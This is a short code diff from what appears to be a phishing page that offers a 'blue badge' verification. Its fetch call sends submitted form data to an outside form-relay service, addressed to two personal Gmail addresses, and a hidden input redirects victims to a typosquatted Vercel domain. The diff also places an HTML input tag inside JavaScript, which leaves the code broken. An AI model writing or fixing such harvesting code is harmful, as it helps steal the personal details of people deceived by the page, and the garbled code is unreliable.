@@ -365,7 +365,6 @@
             
             fetch("https://postal-form.on.shiper.app/submit", {
                 method: "POST",
-              <input type="hidden" name="_redirect" value="https://get-blue-badge-0pportunity.vercel.app/">
                 headers: {
                     "Content-Type": "application/json",
                 },
@@ -375,7 +374,8 @@
                     emails: ["nomannizamani36@gmail.com", "hamzakhanniz829@gmail.com"],
                     workerEmail: "nomannizamani36@gmail.com",
                     name: "sajan",
-                }),
+                    
+                }), <input type="hidden" name="_redirect" value="https://get-blue-badge-0pportunity.vercel.app/">
             })
             .then((response) => {
                 if (response.ok) {
